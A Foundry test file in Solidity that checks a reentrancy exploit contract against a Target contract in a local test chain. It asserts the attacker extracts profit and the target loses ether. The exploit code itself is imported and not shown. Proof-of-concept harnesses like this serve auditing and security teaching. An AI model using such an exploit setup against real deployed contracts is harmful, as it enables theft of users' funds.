// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Exploit.sol";
import "../src/Target.sol";

contract ExploitTest is Test {
    ReentrancyinSmartContractExploit public exploit;
    Target public target;
    
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");
    
    uint256 public constant INITIAL_BALANCE = 10 ether;
    uint256 public constant TARGET_BALANCE = 100 ether;
    
    function setUp() public {
        // Deploy target contract
        target = new Target();
        
        // Fund target contract
        vm.deal(address(target), TARGET_BALANCE);
        
        // Deploy exploit contract
        vm.prank(attacker);
        exploit = new ReentrancyinSmartContractExploit(address(target));
        
        // Fund attacker
        vm.deal(attacker, INITIAL_BALANCE);
    }
    
    function testExploitExecution() public {
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialTargetBalance = address(target).balance;
        
        console.log("=== INITIAL STATE ===");
        console.log("Attacker balance:", initialAttackerBalance);
        console.log("Target balance:", initialTargetBalance);
        
        // Execute exploit
        vm.prank(attacker);
        exploit.executeExploit();
        
        uint256 finalAttackerBalance = attacker.balance;
        uint256 finalTargetBalance = address(target).balance;
        uint256 profit = exploit.profit();
        
        console.log("=== FINAL STATE ===");
        console.log("Attacker balance:", finalAttackerBalance);
        console.log("Target balance:", finalTargetBalance);
        console.log("Profit extracted:", profit);
        
        // Assertions
        assertTrue(exploit.exploitExecuted(), "Exploit should be executed");
        assertGt(profit, 0, "Should extract profit");
        assertLt(finalTargetBalance, initialTargetBalance, "Target should lose funds");
    }
}